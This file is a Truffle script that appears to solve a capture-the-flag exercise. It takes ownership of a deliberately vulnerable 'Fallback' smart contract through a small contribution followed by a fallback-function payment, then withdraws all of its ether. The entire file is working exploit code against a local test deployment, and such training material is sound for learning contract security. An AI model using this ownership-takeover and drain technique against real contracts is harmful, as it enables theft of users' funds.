const FallbackContract = artifacts.require('Fallback')
const assert = require('assert')

async function execute(callback) {
    // Get attacker account
    let attacker = web3.eth.accounts[1]
    console.log(`Attacker address: ${attacker}`)

    // Instance vulnerable contract
    let contract = await FallbackContract.deployed()

    // Check who's the owner
    let contractOwner = await contract.owner.call()
    assert.equal(contractOwner, web3.eth.accounts[0])
    console.log(`Contract owner: ${contractOwner}`)

    // 1. Make a small contribution
    await contract.contribute({
        from: attacker,
        value: web3.toWei(0.0009, 'ether')
    })    

    // 2. Call the fallback function to become the owner of the contract
    await contract.sendTransaction({
        from: attacker,
        value: web3.toWei(0.00000001, 'ether')
    })

    // Check who's the owner now :)
    contractOwner = await contract.owner.call()
    assert.equal(contractOwner, attacker)
    console.log(`Contract owner: ${contractOwner}`)

    // 3. Withdraw all money
    let response = await contract.withdraw({
        from: attacker
    })
    console.log(`Withdrew all money in transaction ${response.tx}`)

    callback()
}

/**
 * Truffle expects scripts to export a function that takes a single
 * parameter as a callback. The callback should be called when the
 * script finishes.
 */
module.exports = execute
